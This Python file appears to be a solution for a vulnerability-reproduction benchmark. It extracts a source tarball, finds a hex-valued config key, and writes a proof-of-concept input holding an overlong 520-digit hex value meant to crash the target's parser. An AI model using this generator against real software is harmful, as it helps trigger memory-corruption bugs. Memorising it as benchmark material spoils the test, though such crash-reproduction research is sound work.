import os
import re
import tarfile
import tempfile
from typing import List, Optional, Tuple


class Solution:
    def _safe_extract_tar(self, tar_path: str, dst_dir: str) -> None:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                name = m.name
                if not name or name.startswith("/") or name.startswith("\\"):
                    continue
                norm = os.path.normpath(name)
                if norm.startswith("..") or os.path.isabs(norm):
                    continue
                if m.islnk() or m.issym():
                    continue
                if not (m.isfile() or m.isdir()):
                    continue
                out_path = os.path.join(dst_dir, norm)
                out_dir = out_path if m.isdir() else os.path.dirname(out_path)
                out_dir_abs = os.path.abspath(out_dir)
                dst_abs = os.path.abspath(dst_dir)
                if not out_dir_abs.startswith(dst_abs + os.sep) and out_dir_abs != dst_abs:
                    continue
                try:
                    tf.extract(m, dst_dir, set_attrs=False)
                except Exception:
                    pass

    def _iter_text_files(self, root: str) -> List[Tuple[str, str]]:
        out: List[Tuple[str, str]] = []
        for dirpath, dirnames, filenames in os.walk(root):
            dlow = os.path.basename(dirpath).lower()
            if dlow in {"build", "dist", ".git", ".svn", "__pycache__", "cmake-build-debug", "cmake-build-release"}:
                dirnames[:] = []
                continue
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                ext = os.path.splitext(fn)[1].lower()
                if ext in {".o", ".a", ".so", ".dll", ".exe", ".png", ".jpg", ".jpeg", ".gif", ".pdf", ".zip"}:
                    continue
                try:
                    with open(path, "rb") as f:
                        b = f.read()
                except Exception:
                    continue
                if b"\x00" in b:
                    continue
                try:
                    s = b.decode("utf-8", "ignore")
                except Exception:
                    try:
                        s = b.decode("latin-1", "ignore")
                    except Exception:
                        continue
                if not s.strip():
                    continue
                out.append((path, s))
        return out

    def _find_sample_hex_kv(self, files: List[Tuple[str, str]]) -> Optional[Tuple[str, str, str, str, str, str]]:
        kv_line_re = re.compile(
            r'^(?P<prefix>\s*(?P<key>[A-Za-z0-9_.:-]{1,64})\s*(?P<sep>[:=])\s*)(?P<val>(?:0x|0X)?[0-9A-Fa-f]{8,})(?P<suffix>\s*(?:[#;].*)?)$',
            re.M
        )
        json_re = re.compile(
            r'(?P<prefix>"(?P<key>[A-Za-z0-9_.:-]{1,64})"\s*:\s*")(?P<val>(?:0x|0X)?[0-9A-Fa-f]{8,})(?P<suffix>")'
        )

        best = None
        best_score = -1

        for path, s in files:
            fn = os.path.basename(path).lower()
            ext = os.path.splitext(fn)[1].lower()
            is_cfg = ext in {".conf", ".cfg", ".ini", ".cnf", ".config"} or "config" in fn or "conf" in fn or "cfg" in fn or "ini" in fn
            is_src = ext in {".c", ".cc", ".cpp", ".h", ".hpp", ".s", ".S"}
            if is_src:
                continue
            for m in kv_line_re.finditer(s):
                key = m.group("key")
                val = m.group("val")
                sep = m.group("sep")
                prefix = m.group("prefix")
                suffix = m.group("suffix")
                score = 0
                if is_cfg:
                    score += 50
                score += min(len(val), 200) // 4
                klow = key.lower()
                if "hex" in klow:
                    score += 40
                if "key" in klow or "iv" in klow or "seed" in klow or "token" in klow or "secret" in klow:
                    score += 25
                if val.lower().startswith("0x"):
                    score += 10
                if score > best_score:
                    best_score = score
                    best = ("kv", path, key, sep, prefix, suffix)
            for m in json_re.finditer(s):
                key = m.group("key")
                val = m.group("val")
                prefix = m.group("prefix")
                suffix = m.group("suffix")
                score = 0
                if is_cfg or ext in {".json"}:
                    score += 50
                score += min(len(val), 200) // 4
                klow = key.lower()
                if "hex" in klow:
                    score += 40
                if "key" in klow or "iv" in klow or "seed" in klow or "token" in klow or "secret" in klow:
                    score += 25
                if val.lower().startswith("0x"):
                    score += 10
                if score > best_score:
                    best_score = score
                    best = ("json", path, key, ":", prefix, suffix)

        return best

    def _infer_keys_from_source(self, files: List[Tuple[str, str]]) -> List[str]:
        key_set = {}
        cmp_re = re.compile(
            r'\b(?:strcmp|strcasecmp|strncmp|strncasecmp)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*"([^"]{1,80})"\s*(?:,\s*\d+\s*)?\)'
        )
        rev_cmp_re = re.compile(
            r'\b(?:strcmp|strcasecmp|strncmp|strncasecmp)\s*\(\s*"([^"]{1,80})"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*(?:,\s*\d+\s*)?\)'
        )

        hex_ctx_re = re.compile(r'\bhex\b|isxdigit|%2hhx|%02x|0x"|0X"|strtoul|strtol|fromhex|hex2bin|bin2hex', re.I)
        cfg_ctx_re = re.compile(r'config|cfg|ini|fopen|fgets|getline|sscanf|strtok|getopt', re.I)

        for path, s in files:
            ext = os.path.splitext(path)[1].lower()
            if ext not in {".c", ".cc", ".cpp", ".h", ".hpp"}:
                continue
            has_cfg = bool(cfg_ctx_re.search(s))
            if not has_cfg:
                continue
            for m in cmp_re.finditer(s):
                k = m.group(2)
                if not k or len(k) > 64:
                    continue
                if any(ch.isspace() for ch in k):
                    continue
                klow = k.lower()
                score = 0
                if "hex" in klow:
                    score += 40
                if "key" in klow or "iv" in klow or "seed" in klow or "token" in klow or "secret" in klow:
                    score += 20
                if ":" in k:
                    score += 10
                if "_" in k:
                    score += 5
                pos = m.start()
                ctx = s[max(0, pos - 250): min(len(s), pos + 250)]
                if hex_ctx_re.search(ctx):
                    score += 30
                if score <= 0:
                    continue
                key_set[k] = max(key_set.get(k, 0), score)
            for m in rev_cmp_re.finditer(s):
                k = m.group(1)
                if not k or len(k) > 64:
                    continue
                if any(ch.isspace() for ch in k):
                    continue
                klow = k.lower()
                score = 0
                if "hex" in klow:
                    score += 40
                if "key" in klow or "iv" in klow or "seed" in klow or "token" in klow or "secret" in klow:
                    score += 20
                if ":" in k:
                    score += 10
                if "_" in k:
                    score += 5
                pos = m.start()
                ctx = s[max(0, pos - 250): min(len(s), pos + 250)]
                if hex_ctx_re.search(ctx):
                    score += 30
                if score <= 0:
                    continue
                key_set[k] = max(key_set.get(k, 0), score)

        keys_sorted = sorted(key_set.items(), key=lambda kv: (-kv[1], len(kv[0]), kv[0]))
        return [k for k, _ in keys_sorted[:8]]

    def _infer_need_0x(self, files: List[Tuple[str, str]]) -> bool:
        pat = re.compile(r'"0x"|\'0x\'|"0X"|\'0X\'|strncmp\s*\(\s*[^,]+,\s*"0x"\s*,\s*2\s*\)', re.I)
        for path, s in files:
            ext = os.path.splitext(path)[1].lower()
            if ext not in {".c", ".cc", ".cpp", ".h", ".hpp"}:
                continue
            if pat.search(s):
                return True
        return False

    def _make_hex_value(self, total_digits: int, need_0x: bool) -> str:
        if total_digits < 2:
            total_digits = 2
        if total_digits % 2 != 0:
            total_digits += 1
        digits = "A" * total_digits
        if need_0x:
            return "0x" + digits
        return digits

    def _build_poc_from_sample(self, style: str, sample_path: str, key: str, sep: str, prefix: str, suffix: str,
                               files_map: dict, hex_value: str) -> bytes:
        s = files_map.get(sample_path, "")
        if not s:
            return (f"{key}={hex_value}\n").encode("ascii", "ignore")

        if style == "kv":
            line_re = re.compile(
                r'^(?P<prefix>\s*' + re.escape(key) + r'\s*' + re.escape(sep) + r'\s*)(?P<val>(?:0x|0X)?[0-9A-Fa-f]{8,})(?P<suffix>\s*(?:[#;].*)?)$',
                re.M
            )

            def repl(m):
                return m.group("prefix") + hex_value + m.group("suffix")

            s2, n = line_re.subn(repl, s, count=1)
            if n == 0:
                s2 = s.rstrip("\n") + "\n" + f"{key}{sep}{hex_value}\n"
            return s2.encode("utf-8", "ignore")

        if style == "json":
            json_re = re.compile(
                r'(?P<prefix>"' + re.escape(key) + r'"\s*:\s*")(?P<val>(?:0x|0X)?[0-9A-Fa-f]{8,})(?P<suffix>")'
            )

            def repl(m):
                return m.group("prefix") + hex_value + m.group("suffix")

            s2, n = json_re.subn(repl, s, count=1)
            if n == 0:
                s2 = '{"' + key + '":"' + hex_value + '"}\n'
            return s2.encode("utf-8", "ignore")

        return (f"{key}={hex_value}\n").encode("ascii", "ignore")

    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            root = src_path
            if os.path.isfile(src_path):
                try:
                    self._safe_extract_tar(src_path, td)
                    root = td
                except Exception:
                    root = src_path

            files = self._iter_text_files(root)
            files_map = {p: s for p, s in files}

            sample = self._find_sample_hex_kv(files)
            if sample is not None:
                style, sample_path, key, sep, prefix, suffix = sample
                need_0x = ("0x" in prefix.lower()) or self._infer_need_0x(files)
                # keep total PoC reasonably close to typical crash threshold (e.g., 2*256+2 hex digits)
                hex_value = self._make_hex_value(520, need_0x)
                return self._build_poc_from_sample(style, sample_path, key, sep, prefix, suffix, files_map, hex_value)

            keys = self._infer_keys_from_source(files)
            need_0x = self._infer_need_0x(files)
            hex_value = self._make_hex_value(520, need_0x)

            if not keys:
                return (hex_value + "\n").encode("ascii", "ignore")

            # Prefer a single key to reduce risk of parse failure; pick best inferred.
            key = keys[0]
            # Try a slightly more permissive format with spaces around '='
            line = f"{key} = {hex_value}\n"
            return line.encode("ascii", "ignore")